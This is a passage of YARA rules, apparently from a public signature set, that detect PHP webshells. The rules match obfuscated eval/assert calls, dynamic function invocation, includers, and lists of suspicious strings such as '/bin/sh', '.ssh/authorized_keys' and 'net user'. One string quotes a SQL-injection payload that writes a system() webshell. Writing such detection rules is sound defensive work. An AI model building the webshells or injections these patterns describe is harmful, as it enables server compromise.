// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
filesize < 300KB and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and any of ( $payload* ) and #goto > 1 and
( #chr1 > 10 or #chr2 > 10 or #chr3 > 10 )
}
rule SSC_Swebshell_php_obfuscated_fopo
{
meta:
description = "PHP webshell which eval()s obfuscated string"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "fbcff8ea5ce04fc91c05384e847f2c316e013207"
hash = "6da57ad8be1c587bb5cc8a1413f07d10fb314b72"
hash = "a698441f817a9a72908a0d93a34133469f33a7b34972af3e351bdccae0737d99"
date = "2021/01/12"
strings:
$payload = /(\beval[\t ]*\([^)]|\bassert[\t ]*\([^)])/ nocase wide ascii
// ;@eval(
$one1 = "7QGV2YWwo" wide ascii
$one2 = "tAZXZhbC" wide ascii
$one3 = "O0BldmFsK" wide ascii
$one4 = "sAQABlAHYAYQBsACgA" wide ascii
$one5 = "7AEAAZQB2AGEAbAAoA" wide ascii
$one6 = "OwBAAGUAdgBhAGwAKA" wide ascii
// ;@assert(
$two1 = "7QGFzc2VydC" wide ascii
$two2 = "tAYXNzZXJ0K" wide ascii
$two3 = "O0Bhc3NlcnQo" wide ascii
$two4 = "sAQABhAHMAcwBlAHIAdAAoA" wide ascii
$two5 = "7AEAAYQBzAHMAZQByAHQAKA" wide ascii
$two6 = "OwBAAGEAcwBzAGUAcgB0ACgA" wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
filesize < 3000KB and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and $payload and
( any of ( $one* ) or any of ( $two* ) )
}
rule SSC_Swebshell_php_gzinflated
{
meta:
description = "PHP webshell which directly eval()s obfuscated string"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/12"
hash = "49e5bc75a1ec36beeff4fbaeb16b322b08cf192d"
strings:
$payload2 = /eval\s?\(\s?("\?>".)?gzinflate\s?\(\s?base64_decode\s?\(/ wide ascii nocase
$payload4 = /eval\s?\(\s?("\?>".)?gzuncompress\s?\(\s?(base64_decode|gzuncompress)/ wide ascii nocase
$payload6 = /eval\s?\(\s?("\?>".)?gzdecode\s?\(\s?base64_decode\s?\(/ wide ascii nocase
$payload7 = /eval\s?\(\s?base64_decode\s?\(/ wide ascii nocase
$payload8 = /eval\s?\(\s?pack\s?\(/ wide ascii nocase
// api.telegram
$fp1 = "YXBpLnRlbGVncmFtLm9"
//strings from private rule php_false_positive
// try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
// a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
$gfp1  = "eval(\"return [$serialised_parameter" // elgg
$gfp2  = "$this->assert(strpos($styles, $"
$gfp3  = "$module = new $_GET['module']($_GET['scope']);"
$gfp4  = "$plugin->$_POST['action']($_POST['id']);"
$gfp5  = "$_POST[partition_by]($_POST["
$gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
$gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
$gfp8  = "Smarty_Internal_Debug::start_render($_template);"
$gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
$gfp11 = "(eval (getenv \"EPROLOG\")))"
$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
filesize < 700KB and not (
any of ( $gfp* )
)
and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and 1 of ( $payload* ) and not any of ( $fp* )
}
rule SSC_Swebshell_php_obfuscated_3
{
meta:
description = "PHP webshell which eval()s obfuscated string"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/04/17"
strings:
$obf1 = "chr(" wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
//strings from private rule capa_php_callback
$callback1 = /\bob_start[\t ]*\([^)]/ nocase wide ascii
$callback2 = /\barray_diff_uassoc[\t ]*\([^)]/ nocase wide ascii
$callback3 = /\barray_diff_ukey[\t ]*\([^)]/ nocase wide ascii
$callback4 = /\barray_filter[\t ]*\([^)]/ nocase wide ascii
$callback5 = /\barray_intersect_uassoc[\t ]*\([^)]/ nocase wide ascii
$callback6 = /\barray_intersect_ukey[\t ]*\([^)]/ nocase wide ascii
$callback7 = /\barray_map[\t ]*\([^)]/ nocase wide ascii
$callback8 = /\barray_reduce[\t ]*\([^)]/ nocase wide ascii
$callback9 = /\barray_udiff_assoc[\t ]*\([^)]/ nocase wide ascii
$callback10 = /\barray_udiff_uassoc[\t ]*\([^)]/ nocase wide ascii
$callback11 = /\barray_udiff[\t ]*\([^)]/ nocase wide ascii
$callback12 = /\barray_uintersect_assoc[\t ]*\([^)]/ nocase wide ascii
$callback13 = /\barray_uintersect_uassoc[\t ]*\([^)]/ nocase wide ascii
$callback14 = /\barray_uintersect[\t ]*\([^)]/ nocase wide ascii
$callback15 = /\barray_walk_recursive[\t ]*\([^)]/ nocase wide ascii
$callback16 = /\barray_walk[\t ]*\([^)]/ nocase wide ascii
$callback17 = /\bassert_options[\t ]*\([^)]/ nocase wide ascii
$callback18 = /\buasort[\t ]*\([^)]/ nocase wide ascii
$callback19 = /\buksort[\t ]*\([^)]/ nocase wide ascii
$callback20 = /\busort[\t ]*\([^)]/ nocase wide ascii
$callback21 = /\bpreg_replace_callback[\t ]*\([^)]/ nocase wide ascii
$callback22 = /\bspl_autoload_register[\t ]*\([^)]/ nocase wide ascii
$callback23 = /\biterator_apply[\t ]*\([^)]/ nocase wide ascii
$callback24 = /\bcall_user_func[\t ]*\([^)]/ nocase wide ascii
$callback25 = /\bcall_user_func_array[\t ]*\([^)]/ nocase wide ascii
$callback26 = /\bregister_shutdown_function[\t ]*\([^)]/ nocase wide ascii
$callback27 = /\bregister_tick_function[\t ]*\([^)]/ nocase wide ascii
$callback28 = /\bset_error_handler[\t ]*\([^)]/ nocase wide ascii
$callback29 = /\bset_exception_handler[\t ]*\([^)]/ nocase wide ascii
$callback30 = /\bsession_set_save_handler[\t ]*\([^)]/ nocase wide ascii
$callback31 = /\bsqlite_create_aggregate[\t ]*\([^)]/ nocase wide ascii
$callback32 = /\bsqlite_create_function[\t ]*\([^)]/ nocase wide ascii
$callback33 = /\bmb_ereg_replace_callback[\t ]*\([^)]/ nocase wide ascii
$m_callback1 = /\bfilter_var[\t ]*\([^)]/ nocase wide ascii
$m_callback2 = "FILTER_CALLBACK" fullword wide ascii
$cfp1 = /ob_start\(['\"]ob_gzhandler/ nocase wide ascii
$cfp2 = "IWPML_Backend_Action_Loader" ascii wide
$cfp3 = "<?phpclass WPML" ascii
//strings from private rule capa_php_payload
// \([^)] to avoid matching on e.g. eval() in comments
$cpayload1 = /\beval[\t ]*\([^)]/ nocase wide ascii
$cpayload2 = /\bexec[\t ]*\([^)]/ nocase wide ascii
$cpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload4 = /\bpassthru[\t ]*\([^)]/ nocase wide ascii
$cpayload5 = /\bsystem[\t ]*\([^)]/ nocase wide ascii
$cpayload6 = /\bpopen[\t ]*\([^)]/ nocase wide ascii
$cpayload7 = /\bproc_open[\t ]*\([^)]/ nocase wide ascii
$cpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload9 = /\bassert[\t ]*\([^)0]/ nocase wide ascii
$cpayload10 = /\bpreg_replace[\t ]*\(.{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
$cpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload13 = /\bmb_eregi_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase wide ascii
$cpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase wide ascii
$m_cpayload_preg_filter1 = /\bpreg_filter[\t ]*\([^\)]/ nocase wide ascii
$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
// TODO backticks
//strings from private rule capa_php_obfuscation_single
$cobfs1 = "gzinflate" fullword nocase wide ascii
$cobfs2 = "gzuncompress" fullword nocase wide ascii
$cobfs3 = "gzdecode" fullword nocase wide ascii
$cobfs4 = "base64_decode" fullword nocase wide ascii
$cobfs5 = "pack" fullword nocase wide ascii
$cobfs6 = "undecode" fullword nocase wide ascii
//strings from private rule capa_gen_sus
// these strings are just a bit suspicious, so several of them are needed, depending on filesize
$gen_bit_sus1  = /:\s{0,20}eval}/ nocase wide ascii
$gen_bit_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
$gen_bit_sus6  = "self.delete"
$gen_bit_sus9  = "\"cmd /c" nocase
$gen_bit_sus10 = "\"cmd\"" nocase
$gen_bit_sus11 = "\"cmd.exe" nocase
$gen_bit_sus12 = "%comspec%" wide ascii
$gen_bit_sus13 = "%COMSPEC%" wide ascii
//TODO:$gen_bit_sus12 = ".UserName" nocase
$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
// bonus string for proxylogon exploiting webshells
$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
$gen_bit_sus21 = "\"upload\"" wide ascii
$gen_bit_sus22 = "\"Upload\"" wide ascii
$gen_bit_sus23 = "UPLOAD" fullword wide ascii
$gen_bit_sus24 = "fileupload" wide ascii
$gen_bit_sus25 = "file_upload" wide ascii
// own base64 func
$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
$gen_bit_sus30 = "serv-u" wide ascii
$gen_bit_sus31 = "Serv-u" wide ascii
$gen_bit_sus32 = "Army" fullword wide ascii
// single letter paramweter
$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
$gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
$gen_bit_sus35 = "crack" fullword wide ascii
$gen_bit_sus44 = "<pre>" wide ascii
$gen_bit_sus45 = "<PRE>" wide ascii
$gen_bit_sus46 = "shell_" wide ascii
$gen_bit_sus47 = "Shell" fullword wide ascii
$gen_bit_sus50 = "bypass" wide ascii
$gen_bit_sus51 = "suhosin" wide ascii
$gen_bit_sus52 = " ^ $" wide ascii
$gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
$gen_bit_sus55 = /\w'\.'\w/ wide ascii
$gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
$gen_bit_sus57 = "dumper" wide ascii
$gen_bit_sus59 = "'cmd'" wide ascii
$gen_bit_sus60 = "\"execute\"" wide ascii
$gen_bit_sus61 = "/bin/sh" wide ascii
$gen_bit_sus62 = "Cyber" wide ascii
$gen_bit_sus63 = "portscan" fullword wide ascii
//$gen_bit_sus64 = "\"command\"" fullword wide ascii
//$gen_bit_sus65 = "'command'" fullword wide ascii
$gen_bit_sus66 = "whoami" fullword wide ascii
$gen_bit_sus67 = "$password='" fullword wide ascii
$gen_bit_sus68 = "$password=\"" fullword wide ascii
$gen_bit_sus69 = "$cmd" fullword wide ascii
$gen_bit_sus70 = "\"?>\"." fullword wide ascii
$gen_bit_sus71 = "Hacking" fullword wide ascii
$gen_bit_sus72 = "hacking" fullword wide ascii
$gen_bit_sus73 = ".htpasswd" wide ascii
$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii
// very suspicious strings, one is enough
$gen_much_sus7  = "Web Shell" nocase
$gen_much_sus8  = "WebShell" nocase
$gen_much_sus3  = "hidded shell"
$gen_much_sus4  = "WScript.Shell.1" nocase
$gen_much_sus5  = "AspExec"
$gen_much_sus14 = "\\pcAnywhere\\" nocase
$gen_much_sus15 = "antivirus" nocase
$gen_much_sus16 = "McAfee" nocase
$gen_much_sus17 = "nishang"
$gen_much_sus18 = "\"unsafe" fullword wide ascii
$gen_much_sus19 = "'unsafe" fullword wide ascii
$gen_much_sus24 = "exploit" fullword wide ascii
$gen_much_sus25 = "Exploit" fullword wide ascii
$gen_much_sus26 = "TVqQAAMAAA" wide ascii
$gen_much_sus30 = "Hacker" wide ascii
$gen_much_sus31 = "HACKED" fullword wide ascii
$gen_much_sus32 = "hacked" fullword wide ascii
$gen_much_sus33 = "hacker" wide ascii
$gen_much_sus34 = "grayhat" nocase wide ascii
$gen_much_sus35 = "Microsoft FrontPage" wide ascii
$gen_much_sus36 = "Rootkit" wide ascii
$gen_much_sus37 = "rootkit" wide ascii
$gen_much_sus38 = "/*-/*-*/" wide ascii
$gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
$gen_much_sus40 = "\"e\"+\"v" wide ascii
$gen_much_sus41 = "a\"+\"l\"" wide ascii
$gen_much_sus42 = "\"+\"(\"+\"" wide ascii
$gen_much_sus43 = "q\"+\"u\"" wide ascii
$gen_much_sus44 = "\"u\"+\"e" wide ascii
$gen_much_sus45 = "/*//*/" wide ascii
$gen_much_sus46 = "(\"/*/\"" wide ascii
$gen_much_sus47 = "eval(eval(" wide ascii
// self remove
$gen_much_sus48 = "unlink(__FILE__)" wide ascii
$gen_much_sus49 = "Shell.Users" wide ascii
$gen_much_sus50 = "PasswordType=Regular" wide ascii
$gen_much_sus51 = "-Expire=0" wide ascii
$gen_much_sus60 = "_=$$_" wide ascii
$gen_much_sus61 = "_=$$_" wide ascii
$gen_much_sus62 = "++;$" wide ascii
$gen_much_sus63 = "++; $" wide ascii
$gen_much_sus64 = "_.=$_" wide ascii
$gen_much_sus70 = "-perm -04000" wide ascii
$gen_much_sus71 = "-perm -02000" wide ascii
$gen_much_sus72 = "grep -li password" wide ascii
$gen_much_sus73 = "-name config.inc.php" wide ascii
// touch without parameters sets the time to now, not malicious and gives fp
$gen_much_sus75 = "password crack" wide ascii
$gen_much_sus76 = "mysqlDll.dll" wide ascii
$gen_much_sus77 = "net user" wide ascii
$gen_much_sus78 = "suhosin.executor.disable_" wide ascii
$gen_much_sus79 = "disabled_suhosin" wide ascii
$gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
$gen_much_sus81 = /strrev\(['"]/ wide ascii
$gen_much_sus82 = "PHPShell" fullword wide ascii
$gen_much_sus821= "PHP Shell" fullword wide ascii
$gen_much_sus83 = "phpshell" fullword wide ascii
$gen_much_sus84 = "PHPshell" fullword wide ascii
$gen_much_sus87 = "deface" wide ascii
$gen_much_sus88 = "Deface" wide ascii
$gen_much_sus89 = "backdoor" wide ascii
$gen_much_sus90 = "r00t" fullword wide ascii
$gen_much_sus91 = "xp_cmdshell" fullword wide ascii
$gif = { 47 49 46 38 }
condition:
(
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and
( (
not any of ( $cfp* ) and
(
any of ( $callback* )  or
all of ( $m_callback* )
)
)
or (
any of ( $cpayload* ) or
all of ( $m_cpayload_preg_filter* )
)
) and (
any of ( $cobfs* )
)
and
( filesize < 1KB or
( filesize < 3KB and
( (
$gif at 0 or
(
filesize < 4KB and
(
1 of ( $gen_much_sus* ) or
2 of ( $gen_bit_sus* )
)
) or (
filesize < 20KB and
(
2 of ( $gen_much_sus* ) or
3 of ( $gen_bit_sus* )
)
) or (
filesize < 50KB and
(
2 of ( $gen_much_sus* ) or
4 of ( $gen_bit_sus* )
)
) or (
filesize < 100KB and
(
2 of ( $gen_much_sus* ) or
6 of ( $gen_bit_sus* )
)
) or (
filesize < 150KB and
(
3 of ( $gen_much_sus* ) or
7 of ( $gen_bit_sus* )
)
) or (
filesize < 500KB and
(
4 of ( $gen_much_sus* ) or
8 of ( $gen_bit_sus* )
)
)
)
or #obf1 > 10 ) ) )
}
rule SSC_Swebshell_php_includer_eval
{
meta:
description = "PHP webshell which eval()s another included file"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "3a07e9188028efa32872ba5b6e5363920a6b2489"
date = "2021/01/13"
strings:
$payload1 = "eval" fullword wide ascii
$payload2 = "assert" fullword wide ascii
$include1 = "$_FILE" wide ascii
$include2 = "include" wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
filesize < 200 and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and 1 of ( $payload* ) and 1 of ( $include* )
}
rule SSC_Swebshell_php_includer_tiny
{
meta:
description = "Suspicious: Might be PHP webshell includer, check the included file"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/04/17"
strings:
$php_include1 = /include\(\$_(GET|POST|REQUEST)\[/ nocase wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
filesize < 100 and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and any of ( $php_include* )
}
rule SSC_Swebshell_php_dynamic
{
meta:
description = "PHP webshell using function name from variable, e.g. $a='ev'.'al'; $a($code)"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "65dca1e652d09514e9c9b2e0004629d03ab3c3ef"
hash = "b8ab38dc75cec26ce3d3a91cb2951d7cdd004838"
hash = "c4765e81550b476976604d01c20e3dbd415366df"
date = "2021/01/13"
score = 60
strings:
$pd_fp1 = "whoops_add_stack_frame" wide ascii
$pd_fp2 = "new $ec($code, $mode, $options, $userinfo);" wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
//strings from private rule capa_php_dynamic
// php variable regex from https://www.php.net/manual/en/language.variables.basics.php
$dynamic1 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(\$/ wide ascii
$dynamic2 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\("/ wide ascii
$dynamic3 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\('/ wide ascii
$dynamic4 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(str/ wide ascii
$dynamic5 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(\)/ wide ascii
$dynamic6 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(@/ wide ascii
$dynamic7 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(base64_decode/ wide ascii
condition:
filesize > 20 and filesize < 200 and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and (
any of ( $dynamic* )
)
and not any of ( $pd_fp* )
}
rule SSC_Swebshell_php_dynamic_big
{
meta:
description = "PHP webshell using $a($code) for kind of eval with encoded blob to decode, e.g. b374k"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/02/07"
modified = "2022-08-19"
score = 50
strings:
//strings from private rule capa_bin_files
$dex   = { 64 65 ( 78 | 79 ) 0a 30 }
$pack  = { 50 41 43 4b 00 00 00 02 00 }
//strings from private rule capa_php_new_long
// no <?=
$new_php2 = "<?php" nocase wide ascii
$new_php3 = "<script language=\"php" nocase wide ascii
$php_short = "<?"
//strings from private rule capa_php_dynamic
// php variable regex from https://www.php.net/manual/en/language.variables.basics.php
$dynamic1 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(\$/ wide ascii
$dynamic2 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\("/ wide ascii
$dynamic3 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\('/ wide ascii
$dynamic4 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(str/ wide ascii
$dynamic5 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(\)/ wide ascii
$dynamic6 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(@/ wide ascii
$dynamic7 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(base64_decode/ wide ascii
//strings from private rule capa_gen_sus
// these strings are just a bit suspicious, so several of them are needed, depending on filesize
$gen_bit_sus1  = /:\s{0,20}eval}/ nocase wide ascii
$gen_bit_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
$gen_bit_sus6  = "self.delete"
$gen_bit_sus9  = "\"cmd /c" nocase
$gen_bit_sus10 = "\"cmd\"" nocase
$gen_bit_sus11 = "\"cmd.exe" nocase
$gen_bit_sus12 = "%comspec%" wide ascii
$gen_bit_sus13 = "%COMSPEC%" wide ascii
//TODO:$gen_bit_sus12 = ".UserName" nocase
$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
// bonus string for proxylogon exploiting webshells
$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
$gen_bit_sus21 = "\"upload\"" wide ascii
$gen_bit_sus22 = "\"Upload\"" wide ascii
$gen_bit_sus23 = "UPLOAD" fullword wide ascii
$gen_bit_sus24 = "fileupload" wide ascii
$gen_bit_sus25 = "file_upload" wide ascii
// own base64 func
$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
$gen_bit_sus30 = "serv-u" wide ascii
$gen_bit_sus31 = "Serv-u" wide ascii
$gen_bit_sus32 = "Army" fullword wide ascii
// single letter paramweter
$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
$gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
$gen_bit_sus35 = "crack" fullword wide ascii
$gen_bit_sus44 = "<pre>" wide ascii
$gen_bit_sus45 = "<PRE>" wide ascii
$gen_bit_sus46 = "shell_" wide ascii
$gen_bit_sus47 = "Shell" fullword wide ascii
$gen_bit_sus50 = "bypass" wide ascii
$gen_bit_sus51 = "suhosin" wide ascii
$gen_bit_sus52 = " ^ $" wide ascii
$gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
$gen_bit_sus55 = /\w'\.'\w/ wide ascii
$gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
$gen_bit_sus57 = "dumper" wide ascii
$gen_bit_sus59 = "'cmd'" wide ascii
$gen_bit_sus60 = "\"execute\"" wide ascii
$gen_bit_sus61 = "/bin/sh" wide ascii
$gen_bit_sus62 = "Cyber" wide ascii
$gen_bit_sus63 = "portscan" fullword wide ascii
//$gen_bit_sus64 = "\"command\"" fullword wide ascii
//$gen_bit_sus65 = "'command'" fullword wide ascii
$gen_bit_sus66 = "whoami" fullword wide ascii
$gen_bit_sus67 = "$password='" fullword wide ascii
$gen_bit_sus68 = "$password=\"" fullword wide ascii
$gen_bit_sus69 = "$cmd" fullword wide ascii
$gen_bit_sus70 = "\"?>\"." fullword wide ascii
$gen_bit_sus71 = "Hacking" fullword wide ascii
$gen_bit_sus72 = "hacking" fullword wide ascii
$gen_bit_sus73 = ".htpasswd" wide ascii
$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii
// very suspicious strings, one is enough
$gen_much_sus7  = "Web Shell" nocase
$gen_much_sus8  = "WebShell" nocase
$gen_much_sus3  = "hidded shell"
$gen_much_sus4  = "WScript.Shell.1" nocase
$gen_much_sus5  = "AspExec"
$gen_much_sus14 = "\\pcAnywhere\\" nocase
$gen_much_sus15 = "antivirus" nocase
$gen_much_sus16 = "McAfee" nocase
$gen_much_sus17 = "nishang"
$gen_much_sus18 = "\"unsafe" fullword wide ascii
$gen_much_sus19 = "'unsafe" fullword wide ascii
$gen_much_sus24 = "exploit" fullword wide ascii
$gen_much_sus25 = "Exploit" fullword wide ascii
$gen_much_sus26 = "TVqQAAMAAA" wide ascii
$gen_much_sus30 = "Hacker" wide ascii
$gen_much_sus31 = "HACKED" fullword wide ascii
$gen_much_sus32 = "hacked" fullword wide ascii
$gen_much_sus33 = "hacker" wide ascii
$gen_much_sus34 = "grayhat" nocase wide ascii
$gen_much_sus35 = "Microsoft FrontPage" wide ascii
$gen_much_sus36 = "Rootkit" wide ascii
$gen_much_sus37 = "rootkit" wide ascii
$gen_much_sus38 = "/*-/*-*/" wide ascii
$gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
$gen_much_sus40 = "\"e\"+\"v" wide ascii
$gen_much_sus41 = "a\"+\"l\"" wide ascii
$gen_much_sus42 = "\"+\"(\"+\"" wide ascii
$gen_much_sus43 = "q\"+\"u\"" wide ascii
$gen_much_sus44 = "\"u\"+\"e" wide ascii
$gen_much_sus45 = "/*//*/" wide ascii
$gen_much_sus46 = "(\"/*/\"" wide ascii
$gen_much_sus47 = "eval(eval(" wide ascii
// self remove
$gen_much_sus48 = "unlink(__FILE__)" wide ascii
$gen_much_sus49 = "Shell.Users" wide ascii
$gen_much_sus50 = "PasswordType=Regular" wide ascii
$gen_much_sus51 = "-Expire=0" wide ascii
$gen_much_sus60 = "_=$$_" wide ascii
$gen_much_sus61 = "_=$$_" wide ascii
$gen_much_sus62 = "++;$" wide ascii
$gen_much_sus63 = "++; $" wide ascii
$gen_much_sus64 = "_.=$_" wide ascii
$gen_much_sus70 = "-perm -04000" wide ascii
$gen_much_sus71 = "-perm -02000" wide ascii
$gen_much_sus72 = "grep -li password" wide ascii
$gen_much_sus73 = "-name config.inc.php" wide ascii
// touch without parameters sets the time to now, not malicious and gives fp
$gen_much_sus75 = "password crack" wide ascii
$gen_much_sus76 = "mysqlDll.dll" wide ascii
$gen_much_sus77 = "net user" wide ascii
$gen_much_sus78 = "suhosin.executor.disable_" wide ascii
